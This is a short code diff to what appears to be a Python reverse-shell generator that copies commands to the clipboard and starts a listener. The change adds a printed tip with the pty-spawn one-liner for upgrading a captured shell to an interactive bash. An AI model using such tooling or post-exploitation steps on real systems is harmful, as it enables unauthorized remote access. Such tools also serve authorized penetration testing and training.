@@ -180,7 +180,10 @@ def build_command():
 
     if 'SSH_CLIENT' not in os.environ or 'SSH_TTY' not in os.environ:
         copy(command)
-        print(information + 'Reverse shell command copied to clipboard!')
+        print(information + 'Reverse shell command copied to clipboard!' + '\n')
+
+    print(success + 'In case you want to upgrade your shell, you can use:' + '\n')
+    print(Style.BRIGHT + Fore.YELLOW + "python -c 'import pty;pty.spawn(\"/bin/bash\")'" + Fore.RESET + Style.RESET_ALL)
 
 
 def setup_listener():
